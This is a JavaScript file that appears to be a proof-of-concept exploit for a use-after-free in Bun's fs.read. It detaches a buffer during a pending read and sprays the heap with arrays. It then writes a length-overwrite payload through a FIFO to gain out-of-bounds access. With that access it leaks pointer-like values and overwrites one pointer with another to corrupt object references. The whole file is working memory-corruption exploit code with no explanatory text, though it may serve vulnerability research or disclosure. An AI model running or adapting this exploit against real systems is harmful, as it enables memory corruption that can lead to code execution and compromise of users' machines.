import fs from "node:fs";
import { spawnSync } from "node:child_process";
import { join } from "node:path";
import { tmpdir } from "node:os";

const iterations = Number(process.env.ITERATIONS || 32);
const size = Number(process.env.BUF_SIZE || 8192);
const sprayCount = Number(process.env.SPRAY_COUNT || 4096);
const objectPrefixCount = Number(process.env.OBJECT_PREFIX_COUNT || 128);
const slots = Number(process.env.SLOTS || 1024);
const writeOffset = Number(process.env.WRITE_OFFSET || 136);
const newLength = Number(process.env.NEW_LENGTH || 4096);
const oobStart = Number(process.env.OOB_START || 0);
const oobCount = Number(process.env.OOB_COUNT || 2048);
const minRun = Number(process.env.MIN_RUN || 4);
const path = join(tmpdir(), `bun-fs-read-array-oob-object-copy-${process.pid}`);
const retained = [];

const conv = new ArrayBuffer(8);
const convF64 = new Float64Array(conv);
const convU64 = new BigUint64Array(conv);

const mkfifo = spawnSync("mkfifo", [path], { stdio: "inherit" });
if (mkfifo.status !== 0) throw new Error(`mkfifo failed with status ${mkfifo.status}`);
const fd = fs.openSync(path, fs.constants.O_RDWR);

function detach(ab) {
  if (typeof ab.transfer === "function") ab.transfer(0);
  else structuredClone({}, { transfer: [ab] });
}

function gcNow() {
  if (typeof globalThis.Bun?.gc === "function") globalThis.Bun.gc(true);
  if (typeof globalThis.gc === "function") globalThis.gc();
}

function f64ToU64(value) {
  convF64[0] = value;
  return convU64[0];
}

function u64ToF64(value) {
  convU64[0] = value;
  return convF64[0];
}

function hex(value) {
  return `0x${value.toString(16).padStart(16, "0")}`;
}

function isPointerLike(value) {
  return value >= 0x0000100000000000n && value <= 0x00007ffffffffffen && (value & 0x7n) === 0n;
}

function allocateMixedArrays() {
  const out = [];
  for (let i = 0; i < sprayCount; i++) {
    const arr = new Array(slots);
    if (i < objectPrefixCount) {
      const sentinel = { owner: i, marker: `obj-${i}` };
      for (let j = 0; j < slots; j++) arr[j] = sentinel;
      out.push({ type: "object", arrayIndex: i, sentinel, arr });
      continue;
    }

    for (let j = 0; j < slots; j++) arr[j] = 6000.5 + i + (j / 1024);
    out.push({ type: "double", arrayIndex: i, arr });
  }
  return out;
}

function makeLengthPayload() {
  const payload = Buffer.alloc(8);
  payload.writeUInt32LE(newLength >>> 0, 0);
  payload.writeUInt32LE(newLength >>> 0, 4);
  return payload;
}

function findCorruptedDouble() {
  for (const entry of retained) {
    if (entry.type !== "double") continue;
    if (entry.arr.length !== slots) return entry;
  }
  return null;
}

function findPointerRuns(source) {
  const runs = [];
  let current = null;

  for (let offset = 0; offset < oobCount; offset++) {
    const relativeIndex = oobStart + offset;
    const value = source.arr[slots + relativeIndex];
    const bits = typeof value === "number" ? f64ToU64(value) : 0n;

    if (!isPointerLike(bits)) {
      if (current && current.length >= minRun) runs.push(current);
      current = null;
      continue;
    }

    if (current && current.bits === bits && current.start + current.length === relativeIndex) {
      current.length++;
    } else {
      if (current && current.length >= minRun) runs.push(current);
      current = { start: relativeIndex, length: 1, bits };
    }
  }

  if (current && current.length >= minRun) runs.push(current);
  return runs;
}

function scanObjectDrift() {
  const drift = [];
  for (const entry of retained) {
    if (entry.type !== "object") continue;
    for (let slot = 0; slot < slots; slot++) {
      const value = entry.arr[slot];
      if (value !== entry.sentinel) {
        drift.push({
          arrayIndex: entry.arrayIndex,
          slot,
          originalOwner: entry.sentinel.owner,
          currentOwner: value && typeof value === "object" ? value.owner : String(value),
          marker: value && typeof value === "object" ? value.marker : undefined,
        });
        if (drift.length >= 16) return drift;
      }
    }
  }
  return drift;
}

async function runOne(iteration) {
  const ab = new ArrayBuffer(size);
  const view = new Uint8Array(ab);
  view.fill(0x51);

  const done = new Promise(resolve => {
    fs.read(fd, view, writeOffset, 8, null, (err, bytesRead) => resolve({ err, bytesRead }));
  });

  detach(ab);
  gcNow();
  retained.length = 0;
  retained.push(...allocateMixedArrays());
  gcNow();

  fs.writeSync(fd, makeLengthPayload(), 0, 8);
  const result = await done;
  const source = findCorruptedDouble();
  const runs = source ? findPointerRuns(source) : [];
  let write;
  let drift = [];

  if (runs.length >= 2) {
    const src = runs[0];
    const dst = runs.find(run => run.bits !== src.bits) ?? runs[1];
    source.arr[slots + dst.start] = u64ToF64(src.bits);
    write = {
      sourceRelativeIndex: src.start,
      sourceBits: hex(src.bits),
      targetRelativeIndex: dst.start,
      targetPreviousBits: hex(dst.bits),
      targetAfterBits: hex(f64ToU64(source.arr[slots + dst.start])),
    };
    drift = scanObjectDrift();
  }

  const summary = {
    iteration,
    size,
    sprayCount,
    objectPrefixCount,
    slots,
    writeOffset,
    newLength,
    oobCount,
    oobStart,
    bytesRead: result.bytesRead,
    err: result.err?.message,
    source: source && {
      arrayIndex: source.arrayIndex,
      length: source.arr.length,
      first: source.arr[0],
      lastInBounds: source.arr[slots - 1],
    },
    pointerRuns: runs.slice(0, 8).map(run => ({
      start: run.start,
      length: run.length,
      bits: hex(run.bits),
    })),
    write,
    drift,
  };

  console.log(JSON.stringify(summary));
  return drift.length > 0;
}

try {
  for (let i = 1; i <= iterations; i++) {
    if (await runOne(i)) {
      process.exitCode = 86;
      break;
    }
  }
} finally {
  fs.closeSync(fd);
  fs.unlinkSync(path);
}
